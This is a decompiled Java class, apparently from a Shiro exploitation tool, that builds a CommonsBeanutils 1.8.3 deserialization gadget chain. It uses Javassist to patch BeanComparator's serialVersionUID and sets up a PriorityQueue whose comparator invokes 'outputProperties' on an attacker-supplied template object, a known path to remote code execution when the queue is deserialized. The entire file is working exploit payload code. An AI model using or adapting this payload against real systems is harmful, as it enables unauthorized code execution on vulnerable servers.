/*
 * Decompiled with CFR 0.152.
 */
package com.sma11new.exp.shiro.attack.payloads;

import com.sma11new.exp.shiro.attack.payloads.ObjectPayload;
import com.sma11new.exp.shiro.attack.payloads.annotation.Authors;
import com.sma11new.exp.shiro.attack.payloads.annotation.Dependencies;
import com.sma11new.exp.shiro.attack.util.JavassistClassLoader;
import com.sma11new.exp.shiro.attack.util.Reflections;
import java.util.Comparator;
import java.util.PriorityQueue;
import java.util.Queue;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import javassist.NotFoundException;
import org.apache.logging.log4j.util.PropertySource;

@Dependencies(value={"commons-beanutils:commons-beanutils:1.8.3"})
@Authors(value={"SummerSec"})
public class CommonsBeanutilsPropertySource_183
implements ObjectPayload<Queue<Object>> {
    @Override
    public Queue<Object> getObject(Object template2) throws Exception {
        PropertySource propertySource1 = new PropertySource(){

            @Override
            public int getPriority() {
                return 0;
            }
        };
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
        CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");
        try {
            CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
            ctBeanComparator.removeField(ctSUID);
        }
        catch (NotFoundException ctSUID) {
            // empty catch block
        }
        ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));
        Comparator beanComparator = (Comparator)ctBeanComparator.toClass(new JavassistClassLoader()).newInstance();
        ctBeanComparator.defrost();
        Reflections.setFieldValue(beanComparator, "comparator", new PropertySource.Comparator());
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);
        queue.add(propertySource1);
        queue.add(propertySource1);
        Reflections.setFieldValue(queue, "queue", new Object[]{template2, template2});
        Reflections.setFieldValue(beanComparator, "property", "outputProperties");
        return queue;
    }
}

